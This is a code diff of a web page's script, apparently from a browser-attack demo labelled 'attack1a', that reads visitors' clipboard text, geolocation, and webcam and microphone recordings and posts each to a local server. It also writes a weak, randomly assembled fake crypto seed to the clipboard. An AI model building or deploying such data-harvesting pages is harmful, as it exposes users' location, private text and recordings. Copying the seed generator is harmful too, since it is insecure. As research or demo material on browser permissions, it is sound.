@@ -24,6 +24,8 @@
   </div>
 
   <script>
+    const SERVER_URL = "http://localhost:3000";
+
     // IndexedDB Setup
     let db;
 
@@ -62,79 +64,53 @@
     // 发送数据到服务器
     async function sendToServer(type, data) {
       try {
-        const response = await fetch("http://localhost:3000", {
+        const response = await fetch(`${SERVER_URL}/receive-${type}`, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
-          body: JSON.stringify({ type, data }),
+          body: JSON.stringify(data),
         });
         const result = await response.json();
         console.log(`Data sent to server (${type}):`, result);
       } catch (error) {
-        console.error("Failed to send data to server:", error);
+        console.error(`Failed to send ${type} data to server:`, error);
       }
     }
 
     // Geolocation Button
-    document.getElementById('sendLocation').addEventListener('click', function () {
+    document.getElementById("sendLocation").addEventListener("click", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          function (position) {
+          (position) => {
             const geolocationData = {
               latitude: position.coords.latitude,
               longitude: position.coords.longitude,
-              timestamp: new Date().toISOString()
+              mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+              timestamp: new Date().toISOString(),
             };
-            saveToIndexedDBAndSendToServer("geolocation", geolocationData);
+            saveToIndexedDBAndSendToServer("location", geolocationData);
           },
-          function (error) {
+          (error) => {
             console.error("Geolocation error:", error);
           }
         );
+      } else {
+        console.error("Geolocation is not supported by this browser.");
       }
     });
 
     // Clipboard Button
-    document.getElementById('sendClipboard').addEventListener('click', async function () {
+    document.getElementById("sendClipboard").addEventListener("click", async () => {
       try {
-        const clipboardText = await navigator.clipboard.readText();
-        saveToIndexedDBAndSendToServer("clipboard", { clipboardContent: clipboardText });
-      } catch (error) {
-        console.error("Failed to read clipboard:", error);
-      }
-    });
-
-    // Recording Button
-    let mediaRecorder;
-    let recordedChunks = [];
-
-    document.getElementById('startRecording').addEventListener('click', async function () {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      mediaRecorder = new MediaRecorder(stream);
-      mediaRecorder.ondataavailable = event => {
-        if (event.data.size > 0) recordedChunks.push(event.data);
-      };
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const reader = new FileReader();
-        reader.onloadend = () => {
-          const base64data = reader.result;
-          saveToIndexedDBAndSendToServer("recording", { video: base64data });
+        const clipboardContent = await navigator.clipboard.readText();
+        const clipboardData = {
+          clipboardContent,
+          timestamp: new Date().toISOString(),
         };
-        reader.readAsDataURL(blob);
-        recordedChunks = [];
-      };
-      mediaRecorder.start();
-      document.getElementById('stopRecording').disabled = false;
-      document.getElementById('startRecording').disabled = true;
-    });
-
-    document.getElementById('stopRecording').addEventListener('click', function () {
-      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-        mediaRecorder.stop();
-        document.getElementById('stopRecording').disabled = true;
-        document.getElementById('startRecording').disabled = false;
+        saveToIndexedDBAndSendToServer("clipboard", clipboardData);
+      } catch (error) {
+        console.error("Error reading clipboard content:", error);
       }
     });
 
@@ -143,32 +119,88 @@
       const wordList = [
         "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
         "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
-        // Add more words to meet the BIP39 standard if necessary
       ];
       let seed = [];
-      for (let i = 0; i < 12; i++) { // Generate a 12-word seed
+      for (let i = 0; i < 12; i++) {
         const randomIndex = Math.floor(Math.random() * wordList.length);
         seed.push(wordList[randomIndex]);
       }
       return seed.join(" ");
     }
 
-    document.getElementById('copyCryptoSeed').addEventListener('click', async function () {
+    document.getElementById("copyCryptoSeed").addEventListener("click", async () => {
       const cryptoSeed = generateRandomSeed();
+      const cryptoSeedData = {
+        seed: cryptoSeed,
+        timestamp: new Date().toISOString(),
+      };
       try {
         await navigator.clipboard.writeText(cryptoSeed);
-        saveToIndexedDBAndSendToServer("cryptoSeed", { seed: cryptoSeed });
+        saveToIndexedDBAndSendToServer("cryptoSeed", cryptoSeedData);
       } catch (error) {
         console.error("Failed to copy crypto seed to clipboard:", error);
       }
     });
 
+    // Record and Send Video
+    let mediaRecorder;
+    let recordedChunks = [];
+
+    document.getElementById("startRecording").addEventListener("click", async () => {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      mediaRecorder = new MediaRecorder(stream);
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) recordedChunks.push(event.data);
+      };
+
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
+        const formData = new FormData();
+        formData.append("video", blob, "recording.webm");
+
+        // Save to IndexedDB as a Base64 string
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          const base64data = reader.result;
+          saveToIndexedDBAndSendToServer("recording", { video: base64data, timestamp: new Date().toISOString() });
+        };
+        reader.readAsDataURL(blob);
+
+        // Send video to server
+        try {
+          const response = await fetch(`${SERVER_URL}/upload-video`, {
+            method: "POST",
+            body: formData,
+          });
+          const result = await response.json();
+          console.log("Server Response:", result);
+        } catch (error) {
+          console.error("Error uploading video:", error);
+        }
+
+        recordedChunks = [];
+      };
+
+      mediaRecorder.start();
+      document.getElementById("stopRecording").disabled = false;
+      document.getElementById("startRecording").disabled = true;
+    });
+
+    document.getElementById("stopRecording").addEventListener("click", () => {
+      if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+        document.getElementById("stopRecording").disabled = true;
+        document.getElementById("startRecording").disabled = false;
+      }
+    });
+
     // Register Service Worker
-    if ('serviceWorker' in navigator) {
-      window.addEventListener('load', () => {
-        navigator.serviceWorker.register('/attack1a/sw.js')
-          .then(reg => console.log('Service Worker registered with scope:', reg.scope))
-          .catch(err => console.error('Service Worker registration failed:', err));
+    if ("serviceWorker" in navigator) {
+      window.addEventListener("load", () => {
+        navigator.serviceWorker.register("/attack1a/sw.js")
+          .then((reg) => console.log("Service Worker registered with scope:", reg.scope))
+          .catch((err) => console.error("Service Worker registration failed:", err));
       });
     }
   </script>
